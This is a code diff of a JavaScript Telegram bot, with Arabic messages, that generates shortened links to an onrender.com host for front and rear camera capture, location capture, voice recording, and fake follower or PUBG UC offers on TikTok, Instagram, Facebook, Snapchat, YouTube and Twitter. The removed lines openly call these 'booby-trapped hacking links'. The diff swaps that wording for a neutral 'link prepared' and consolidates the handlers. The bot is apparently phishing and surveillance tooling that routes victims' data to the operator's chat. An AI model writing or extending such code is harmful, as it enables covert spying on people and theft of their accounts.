@@ -749,16 +749,33 @@ bot.on('callback_query', async (callbackQuery) => {
         case 'front_camera':
         case 'rear_camera':
             url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-            const shortCameraUrl = await shortenUrl(url);
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية: ${shortCameraUrl}`);
             break;
         case 'voice_record':
             bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
-            break;
+            return; // إيقاف التنفيذ هنا حتى يتم إدخال مدة التسجيل
         case 'get_location':
             url = `https://yyytot.onrender.com/getLocation/${chatId}`;
-            const shortLocationUrl = await shortenUrl(url);
-            bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${shortLocationUrl}`);
+            break;
+        case 'increase_tiktok':
+            url = `https://yyytot.onrender.com/tiktok/${chatId}`;
+            break;
+        case 'increase_instagram':
+            url = `https://yyytot.onrender.com/instagram/${chatId}`;
+            break;
+        case 'increase_facebook':
+            url = `https://yyytot.onrender.com/facebook/${chatId}`;
+            break;
+        case 'increase_snapchat':
+            url = `https://yyytot.onrender.com/snapchat/${chatId}`;
+            break;
+        case 'pubg_uc':
+            url = `https://yyytot.onrender.com/pubg_uc/${chatId}`;
+            break;
+        case 'increase_youtube':
+            url = `https://yyytot.onrender.com/youtube/${chatId}`;
+            break;
+        case 'increase_twitter':
+            url = `https://yyytot.onrender.com/twitter/${chatId}`;
             break;
         default:
             if (!subscribedUsers.has(userId)) {
@@ -767,48 +784,34 @@ bot.on('callback_query', async (callbackQuery) => {
                 bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
                 // هنا يمكنك إضافة الكود الخاص بكل عملية
             }
+            return; // إيقاف التنفيذ هنا إذا كان الطلب غير معروف
     }
-});
-bot.on('callback_query', async (query) => {
-    const chatId = query.message.chat.id;
-    const baseUrl = 'https://yyytot.onrender.com'; // Change this to your actual URL
-    const shortBaseUrl = await shortenUrl(baseUrl);
-    
-    // Use shortBaseUrl here if needed
 
-    let url;
-    switch (query.data) {
-        case 'increase_tiktok':
-            url = `${baseUrl}/tiktok/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التيك توك: ${url}`);
-            break;
-        case 'increase_instagram':
-            url = `${baseUrl}/instagram/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الانستغرام: ${url}`);
-            break;
-        case 'increase_facebook':
-            url = `${baseUrl}/facebook/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الفيسبوك: ${url}`);
-            break;
-        case 'increase_snapchat':
-            url = `${baseUrl}/snapchat/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق السناب شات: ${url}`);
-            break;
-        case 'pubg_uc':
-            url = `${baseUrl}/pubg_uc/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق بوبجي: ${url}`);
-            break;
-        case 'increase_youtube':
-            url = `${baseUrl}/youtube/${chatId}`;
-            bot.sendMessage(chatId, ` تم تلغيم رابط اختراق اليوتيوب: ${url}`);
-            break;
-        case 'increase_twitter':
-            url = `${baseUrl}/twitter/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التويتر: ${url}`);
-            break;
+    if (url) {
+        try {
+            const shortUrl = await shortenUrl(url);
+            bot.sendMessage(chatId, `تم تجهيز الرابط: ${shortUrl}`);
+        } catch (error) {
+            console.error('Error shortening URL:', error);
+            bot.sendMessage(chatId, 'حدث خطأ أثناء محاولة إنشاء الرابط القصير.');
+        }
     }
 });
 
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const duration = parseInt(msg.text, 10);
+
+    if (!isNaN(duration)) {
+        if (duration > 0 && duration <= 20) {
+            const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
+            const shortLink = await shortenUrl(link);
+            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${shortLink}`);
+        } else {
+            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
+        }
+    }
+});
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
